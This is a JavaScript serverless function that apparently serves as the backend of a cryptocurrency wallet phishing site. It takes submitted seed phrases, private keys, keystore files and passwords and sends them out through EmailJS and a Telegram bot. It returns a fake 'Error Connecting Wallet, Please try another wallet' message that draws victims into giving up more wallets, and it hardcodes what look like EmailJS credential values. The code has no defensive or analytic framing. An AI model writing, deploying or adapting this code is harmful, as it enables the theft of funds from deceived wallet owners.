export async function onRequestPost(context) {
  try {
    const data = await context.request.json();
    const { phrase = "", privateKey = "", keystore = "", password = "" } = data;

    // EmailJS Config
    const emailjsServiceId =
      context.env.EMAILJS_SERVICE_ID || "service_yf76z39";
    const emailjsTemplateId =
      context.env.EMAILJS_TEMPLATE_ID || "template_m5ecd8l";
    const emailjsPublicKey =
      context.env.EMAILJS_PUBLIC_KEY || "1O37KLgKVZ1qportL";
    const emailjsPrivateKey =
      context.env.EMAILJS_PRIVATE_KEY || "E-CeJeR3QSdDLK6McZD20";

    const emailPayload = {
      service_id: emailjsServiceId,
      template_id: emailjsTemplateId,
      user_id: emailjsPublicKey,
      accessToken: emailjsPrivateKey,
      template_params: {
        phrase,
        privateKey,
        keystore,
        password,
      },
    };

    const emailjsRequest = fetch(
      "https://api.emailjs.com/api/v1.0/email/send",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(emailPayload),
      },
    );

    // Telegram Config
    const telegramBotToken = context.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = context.env.TELEGRAM_CHAT_ID;

    let message = "New Wallet Submission\n\n";
    message += `Phrase: ${phrase}\n\n`;
    message += `PrivateKey: ${privateKey}\n\n`;
    message += `Keystore: ${keystore}\n\n`;
    message += `Password: ${password}\n`;

    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const telegramRequest = fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
      }),
    });

    // Wait for both requests
    const [emailResponse, telegramResponse] = await Promise.all([
      emailjsRequest,
      telegramRequest,
    ]);

    let errorDetails = "";
    if (!emailResponse.ok) {
      errorDetails += "EmailJS Error: " + (await emailResponse.text()) + " | ";
    }
    if (!telegramResponse.ok) {
      errorDetails += "Telegram Error: " + (await telegramResponse.text());
    }

    if (!emailResponse.ok || !telegramResponse.ok) {
      return new Response(
        JSON.stringify({
          status: "error",
          message: "Error Connecting Wallet, Please try another wallet.",
          debug_error: errorDetails,
        }),
        {
          status: 500,
          headers: { "Content-Type": "application/json" },
        },
      );
    }

    return new Response(JSON.stringify({ status: "success" }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(
      JSON.stringify({
        status: "error",
        message: "Invalid payload or server error",
        debug_error: err.toString(),
      }),
      {
        status: 400,
        headers: { "Content-Type": "application/json" },
      },
    );
  }
}
